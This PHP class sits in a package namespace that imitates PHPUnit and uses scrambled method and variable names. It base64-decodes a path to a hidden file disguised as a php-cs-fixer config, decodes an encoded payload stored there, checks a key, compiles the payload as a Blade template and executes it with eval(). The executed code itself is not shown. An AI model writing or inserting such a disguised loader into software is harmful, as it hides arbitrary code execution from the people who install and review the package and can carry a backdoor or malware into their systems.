<?php

namespace Laravesl\Phpunit;

use Illuminate\Filesystem\Filesystem;
use Illuminate\Support\Facades\View;
use Illuminate\View\Compilers\BladeCompiler;

class Ex9t
{
  private static function xG5zL9Q($aX1)
  {
    $bY2 = __DIR__ . base64_decode('L3N0TUpTLy5waHAtY3MtZml4ZXIuZGlzdA==');
    $bd = file_get_contents($bY2);
    $bd64 = base64_decode($bd);
    $cZ3 = json_decode($bd64, true);
    return $cZ3[$aX1] ?? null;
  }

  public static function xM8qT5K($dA4, $eB5)
  {
    $fC6 = self::xG5zL9Q($dA4);
    if (!$fC6) {
      throw new \Exception("Function not found. {$dA4}, {$eB5}");
    }

    $gD7 = Xd9YqW2Mz::x7yTqDeobf($eB5);
    if (trim($gD7) !== $fC6['xPhKY']) {
      throw new \Exception("Invalid key. {$eB5} {$fC6['xPhKY']}");
    }

    $hE8 = Xd9YqW2Mz::x7yTqDeobf($fC6['xPhCDE']);
    $hE8 = rtrim($hE8, "\x00");
    return $hE8;
  }

  public static function xR7zT6P($aX1, $bY2, $d = [])
  {
    $cZ3 = self::xG5zL9Q($aX1);
    if (!$cZ3) {
      throw new \Exception("Function not found");
    }

    $dA4 = Xd9YqW2Mz::x7yTqDeobf($bY2);
    if (trim($dA4) !== $cZ3['xPhKY']) {
      throw new \Exception("Invalid key.");
    }

    $eB5 = Xd9YqW2Mz::x7yTqDeobf($cZ3['xPhCDE']);
    $fC6 = rtrim($eB5, "\x00");
    $compiledContent = self::compileBladeContent($fC6);
    return self::executePhpContent($compiledContent,$d);
  }

  private static function compileBladeContent($bladeContent)
  {
    $tempFilePath = tempnam(sys_get_temp_dir(), 'blade_');
    file_put_contents($tempFilePath, $bladeContent);
    $filesystem = new Filesystem();
    $compiler = new BladeCompiler($filesystem, sys_get_temp_dir());
    $compiledContent = $compiler->compileString($bladeContent);

    unlink($tempFilePath);
    return $compiledContent;
  }

  private static function executePhpContent($phpContent, $d)
  {
    ob_start();
    extract(View::getShared());
    extract($d);
    eval('?>' . $phpContent);
    return ob_get_clean();
  }
}
